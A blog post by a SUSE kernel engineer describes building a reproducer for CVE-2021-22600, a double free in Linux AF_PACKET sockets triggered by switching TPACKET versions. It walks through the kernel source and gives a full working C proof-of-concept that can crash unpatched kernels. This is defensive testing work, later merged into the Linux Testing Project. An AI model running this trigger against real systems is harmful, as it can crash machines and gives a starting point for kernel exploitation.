---
title: "From zero to double free: The process of creating a reproducer for a kernel vulnerability"
summary: "... or my personal journey of reading code and triggering behaviors."
date: 2023-03-09T23:21:25-03:00
slug: from-zero-to-double-free
cover:
    image: "images/320px-Atom_Bomb_Nuclear_Explosion.jpg"
---

The main responsibility of the Kernel Livepatching team at [SUSE](https://suse.com) is to create livepatches for critical
security bugs. More important than fixing the bug itself is to guarantee that the livepatch will solve
the original problem and not create new ones, so testing the fix properly is crucial.

To test a livepatch, you need a way to reproduce the original bug, but how to test a livepatch when
you don't have a reproducer? Today I'll share my history of creating a reproducer for a security bug
and how it ended up being merged into [Linux Testing Project](http://linux-test-project.github.io/).

# The security bug
Very often commits merged on the upstream Linux repository are disguised as _simple_ code fixes, but
in fact, they are solving critical issues. Take for example
[this patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755).
This change fixes a [double free buf](https://en.wikipedia.org/wiki/Memory_safety) after switching
AF_PACKET socket interface versions. The details of this problem are described in
[CVE-2021-22600](https://www.suse.com/security/cve/CVE-2021-22600.html). The fix for this bug seems
harmless, and the creation of a livepatch was straightforward.

The problem is that there wasn't a **reproducer** ready for testing this CVE patch. Without a
reproducer one needed to be created.

# Packet sockets

The [man pages](https://www.man7.org/linux/man-pages/man7/packet.7.html) describes that: "*Packet
sockets are used to receive or send raw packets at the device driver (OSI Layer 2) level.
They allow the user to implement protocol modules in user space on top of the physical layer*".

According to the official kernel documentation on
[Packet MMAP](https://www.kernel.org/doc/html/latest/networking/packet_mmap.html#what-tpacket-versions-are-available-and-when-to-use-them),
there are currently three TPACKET versions, where _tpacket_version_ can be TPACKET_V1 (default),
TPACKET_V2 and TPACKET_V3.

In summary, the bug consists of a stale pointer when switching between TPACKET versions.

# Reproducer
To create a reproducer there are some questions that need to be answered. For example, what is
the problem, and how it manifests? Looking at the commit message that fixes the issue, it was
mentioned that **rx_owner_map** can be stale when changing the protocol version on
**packet_set_ring** function. This function is called whenever a userspace program calls
[setsockopt](https://man7.org/linux/man-pages/man3/setsockopt.3p.html) with a packet socket,
as we can see below:

```c
  static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
                  int closing, int tx_ring)
  {
          struct pgv *pg_vec = NULL;
          struct packet_sock *po = pkt_sk(sk);
          unsigned long *rx_owner_map = NULL;
          int was_running, order = 0;
          struct packet_ring_buffer *rb;
          struct sk_buff_head *rb_queue;
          __be16 num;
          int err;
          /* Added to avoid minimal code churn */
          struct tpacket_req *req = &req_u->req;

...

          if (req->tp_block_nr) {
...
                  order = get_order(req->tp_block_size);
                  pg_vec = alloc_pg_vec(req, order);
                  if (unlikely(!pg_vec))
                          goto out;
                  switch (po->tp_version) {
                  case TPACKET_V3:
                          /* Block transmit is not supported yet */
                          if (!tx_ring) {
                                  init_prb_bdqc(po, rb, pg_vec, req_u);
                          } else {
                                  struct tpacket_req3 *req3 = &req_u->req3;

                                  if (req3->tp_retire_blk_tov ||
                                      req3->tp_sizeof_priv ||
                                      req3->tp_feature_req_word) {
                                          err = -EINVAL;
                                          goto out_free_pg_vec;
                                  }
                          }
                          break;
                  default:
                          if (!tx_ring) {
                                  rx_owner_map = bitmap_alloc(req->tp_frame_nr,
                                          GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO);
                                  if (!rx_owner_map)
                                          goto out_free_pg_vec;
                          }
                          break;
                  }
          }
          /* Done */
          else {
                  err = -EINVAL;
                  if (unlikely(req->tp_frame_nr))
                          goto out;
          }
...
        mutex_lock(&po->pg_vec_lock);
        if (closing || atomic_read(&po->mapped) == 0) {
                err = 0;
                spin_lock_bh(&rb_queue->lock);
                swap(rb->pg_vec, pg_vec);
                if (po->tp_version <= TPACKET_V2)
                        swap(rb->rx_owner_map, rx_owner_map);
...
		}
        mutex_unlock(&po->pg_vec_lock);

  out_free_pg_vec:
		bitmap_free(rx_owner_map);
		if (pg_vec)
			free_pg_vec(pg_vec, order, req->tp_block_nr);
  out:
          return err;
  }
```

*Note*: The code above doesn't contain the
[patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755)
that fixes the bug.

Let's now check the struct where **rx_owner_map** exists:

```c
struct packet_ring_buffer {
        struct pgv              *pg_vec;

        unsigned int            head;
        unsigned int            frames_per_block;
        unsigned int            frame_size;
        unsigned int            frame_max;

        unsigned int            pg_vec_order;
        unsigned int            pg_vec_pages;
        unsigned int            pg_vec_len;

        unsigned int __percpu   *pending_refcnt;

        union {
                unsigned long                   *rx_owner_map;
                struct tpacket_kbdq_core        prb_bdqc;
        };
};
```

As we can see **rx_owner_map** is part of a union. The patch commit message mentions a stale
pointer, so we can deduct that when the _swap(rb->rx_owner_map, rx_owner_map)_ is called we
can be dealing with **prb_bdqc**, and not with **rx_owner_map**. At this point, it's useful
to have userspace code to exercise the mentioned functions and start poking around it. The
fastest way to search for userspace code using a Linux kernel feature is by checking the
[Linux Kernel selftests](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/tools/testing/selftests?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755)
and the [Linux Testing Project](https://github.com/linux-test-project/ltp).

Both projects contain good examples about how to use different kernel features. It was quick
to find an [example](https://github.com/linux-test-project/ltp/blob/master/testcases/kernel/syscalls/setsockopt/setsockopt02.c)
of TPACKET usage on LTP.

With a test case in hand and some understanding of what is going wrong, we can check how
**rx_owner_map** ends up containing stale data:
* When calling *setsockopt* using TPACKET_V3, RX ring and setting *tp_block_nr*, pg_vec is
  allocated and **init_prb_bdqc** is called setting **prb_bdqc** union member.
* If the next call to *setsockopt*, setting *tp_block_nr* and *tp_frame_nr* as 0, **pg_vec** and
  **rx_owner_map** are released (or it would be prb_bdqc here, since it's an union?), since
  po->mapped is always 0 here (mmap wasn't called to map the buffer)
* Calling *setsockopt* using TPACKET_V2 passing *tp_block_nr* and *tp_frame_nr* as 0, the code goes
  directly to release the swapped **rx_owner_map** that was already released in the previous step.
* ***Double free***.

Using the test case as a starting point, I was able to create my own reproducer:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>

int sock;

struct ring {
	union {
		struct tpacket_req  req;
		struct tpacket_req3 req3;
	};
};

static void set_ver(int ver)
{
	if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, &ver, sizeof(ver)) == -1) {
		perror("setsockopt");
		fprintf(stderr, "Cannot set sock to ver %d\n", ver + 1);
		exit(1);
	}
}

static void __v3_fill(struct ring *ring)
{
	ring->req3.tp_retire_blk_tov = 64;
	ring->req3.tp_sizeof_priv = 0;
	ring->req3.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

	ring->req3.tp_block_size = getpagesize() << 2;
	ring->req3.tp_frame_size = TPACKET_ALIGNMENT << 7;
	ring->req3.tp_block_nr = 256;

	ring->req3.tp_frame_nr = ring->req3.tp_block_size /
				 ring->req3.tp_frame_size *
				 ring->req3.tp_block_nr;
}

static void setup_ring(int mess)
{
	struct ring ring;

	__v3_fill(&ring);

	/*
	 * First time we call setup_ring, using TPACKET_V3, we send the req3
	 * as populated by __v3_fill. In the next calls, we zero two members of
	 * the struct, simulating a 'close' of the socket. This makes afpacket
	 * module to free pg_vec.
	 *
	 * tpacket_v3 does not allocate rx_owner_map, but instead it sets
	 * prb_bdqc, but both are define in a union.
	 */
	if (mess) {
		ring.req3.tp_block_nr = 0;
		ring.req3.tp_frame_nr= 0;
	}
	if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &ring.req3,
			 sizeof(ring.req3)) == -1) {
		perror("setsockopt");
		exit(1);
	}
}

int main(void)
{
	sock = socket(PF_PACKET, SOCK_RAW, 0);
	if (sock == -1) {
		perror("socket");
		exit(1);
	}

	set_ver(TPACKET_V3);

	/* Send complete req3 data */
	setup_ring(0);
	/*
	 * Pass tp_block_nr and tp_frame_nr, releases pg_vec, and rb->rw_owner_map
	 * is freed
	 * */
	setup_ring(1);

	/* With pg_vec released, we can change the socket version to TPACKET_V2 */
	set_ver(TPACKET_V2);

	/*
	 * With V2, we send again the tp_block_nr/tp_frame_nr zeroed, so
	 * afpacket does not try to allocate a pg_vec of rx_owner_map and goes
	 * directly to the cleaning part. For V1/V2, it swaps the current
	 * allocated rw_owner_map (which wasn't allocated this time) with the
	 * previously stored rw_owner_map (freed in the second setup_ring call
	 * above).
	 *
	 * Now, double free on the way!
	 */
	setup_ring(1);

	return 0;
}
```

The comments in the code explains what exactly happens.

*Be careful:* if you are running a kernel without the fix applied (earlier than v5.16-rc6),
running the code above can **crash** your system.

Is a common practice in SUSE to check with QA if a reproducer can be adapted and merged
into LTP. In my case, Martin Doucha was kind enough to adapt the code using the LTP API and
[merge it](https://github.com/linux-test-project/ltp/commit/416029cef77509fc8ac27aa2c7001a23ea624b3f).

# Considerations
The entire process of checking the bug, understanding the problem, checking for reproducer
and triggering it reliably was gratifying. The kernel samples and the LTP are interesting
resources for research and understanding how kernel interfaces are used, and also to
check if a kernel is vulnerable to a known problem that already contains a reproducer.

Thanks for reading until the end. See you in the next post!

# References
[CVE commit fix](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ec6af094ea28f0f2dda1a6a33b14cd57e36a9755)

[LTP reproducer](https://github.com/linux-test-project/ltp/commit/416029cef77509fc8ac27aa2c7001a23ea624b3f)
